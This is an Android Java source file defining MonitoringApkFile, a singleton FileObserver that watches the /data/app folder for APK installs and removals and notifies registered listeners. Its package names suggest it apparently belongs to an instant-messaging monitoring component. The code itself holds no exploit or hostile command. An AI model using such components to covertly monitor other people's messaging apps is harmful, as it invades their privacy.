package com.vvt.imfileobserver;

import java.io.File;
import java.util.HashMap;
import java.util.Iterator;

import android.os.FileObserver;

import com.vvt.im.Customization;
import com.vvt.logger.FxLog;


public class MonitoringApkFile extends FileObserver {
	
	/*=========================== CONSTANT ===============================*/
	private static final String TAG = "MonitoringApkFile";
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
	public static final String APK_FOLDER_PATH = "/data/app";
	/*============================ MEMBER ================================*/
	
	private static MonitoringApkFile sMonitoringApkFile;
	private static HashMap<String, MonitoringApkListener> sListListener;
	private static boolean sIsAlreadyStart;
	/*============================ METHOD ================================*/

	/**
	 * get MonitoringApkFileObserver object.
	 */
	public static MonitoringApkFile getInstance(){
		if (sMonitoringApkFile == null) {
			sMonitoringApkFile = new MonitoringApkFile(APK_FOLDER_PATH);
		}
		return sMonitoringApkFile;
	}
	
	private MonitoringApkFile(String path) {
		super(path);
	}
	
	public boolean register(MonitoringApkListener listener, String fileName){
		if(LOGV) FxLog.v(TAG, "register # ENTER ...");
		
		boolean isRegisSuccess = false;
		if (sListListener == null) {
			sListListener = new HashMap<String,MonitoringApkListener >();
		}
		
		if (sListListener.get(fileName) == null) {
			sListListener.put(fileName, listener);
			isRegisSuccess = true;
			if(LOGD) FxLog.d(TAG, "register # Register success. : " +fileName);
		} else {
			if(LOGD) FxLog.d(TAG, "register # This listener is already regis.");
		} 
		FxLog.v(TAG, "register # EXIT ...");
		return isRegisSuccess;
	}
	
	public boolean unregister(MonitoringApkListener listener, String fileName) {
		boolean isUnregisSuccess = false;
		if(sListListener != null && sListListener.size() > 0) {
			if(sListListener.get(fileName) != null) {
				sListListener.remove(fileName);
				isUnregisSuccess = true;
				if(LOGV) FxLog.v(TAG, "register # Unregister success.");
			} else {
				if(LOGV) FxLog.v(TAG, "register # This listener never have before.");
			}
		}
		return isUnregisSuccess;
	}
	
	public boolean startObserver() {
		if(LOGV) FxLog.v(TAG, "startObserver # ENTER ...");
		
		boolean isRegisSuccess = false;
		File file = new File(APK_FOLDER_PATH);
		if (!sIsAlreadyStart && file.exists()) {
			startWatching();
			sIsAlreadyStart = true;
			isRegisSuccess = true;
			if(LOGD) FxLog.d(TAG, "register # start success.");
		}  else {
			if(LOGD) FxLog.d(TAG, "register # start fail. It start already.");
		}
		if(LOGV) FxLog.v(TAG, "register # EXIT ...");
		if(LOGV) FxLog.v(TAG, "startObserver # EXIT ...");
		return isRegisSuccess;
	}
	
	public boolean stopObserver() {
		if(LOGV) FxLog.v(TAG, "stopObserver # ENTER ...");
		
		boolean isUnregisSuccess = false;
		if(sIsAlreadyStart && sListListener.size() < 1) {
			stopWatching();
			sIsAlreadyStart = false;
			isUnregisSuccess = true;
			sMonitoringApkFile = null;
			if(LOGV) FxLog.v(TAG, "stopObserver # stop success.");
		} else {
			if(LOGW) FxLog.w(TAG, "stopObserver # Can't not stop!. May be It have other Listener.");
		}
		if(LOGV) FxLog.v(TAG, "stopObserver # EXIT ...");
		return isUnregisSuccess;
	}
	
	
	
	
	@Override
	public void onEvent(int event, final String path) {
		if(event == FileObserver.CREATE){
			if(LOGV) FxLog.v(TAG, "onEvent # FileObserver.CREATE");
			Thread thd = new Thread(new Runnable() {
				
				@Override
				public void run() {
					try {
						boolean isHaveFile = ImUtil.isHaveFileName(APK_FOLDER_PATH,".tmp");
						
						//sleep until system rename success.
						while (isHaveFile) {
							FxLog.v(TAG,"thread sleep 2 second for system initialize");
							//sleep 1 second for system initiate, System will rename new install to packet name.
							Thread.sleep(2000);
							FxLog.v(TAG,"thread wakeup! ");
							isHaveFile = ImUtil.isHaveFileName(APK_FOLDER_PATH,".tmp");
						}
						
						for (Iterator<String> it = sListListener.keySet().iterator(); it.hasNext();) {
								sListListener.get(it.next()).onApkFileChange(true,path);
						}
						
					}catch (InterruptedException e) {
						if(LOGE) FxLog.e(TAG,e.getMessage());
					}
				}
			});
			thd.start();
		}
		
		if(event == FileObserver.DELETE) {
			if(LOGV) FxLog.v(TAG, "onEvent # FileObserver.DELETE, Path : " + path);
			
			String fileName = null;
			for (Iterator<String> it = sListListener.keySet().iterator(); it.hasNext();) {
				fileName = it.next();
				if(path.contains(fileName)) {
					sListListener.get(fileName).onApkFileChange(false, path);
					break;
				}
			}
		}
		
		if (event == FileObserver.DELETE_SELF) {
			if(LOGV) FxLog.v(TAG, "onEvent # FileObserver.DELETE_SELF, path : " +path);
			String fileName = null;
			for (Iterator<String> it = sListListener.keySet().iterator(); it.hasNext();) {
				fileName = it.next();
				if(path.contains(fileName)) {
					sListListener.get(fileName).onApkFileChange(false, path);
					break;
				}
			}
		}

	}

}
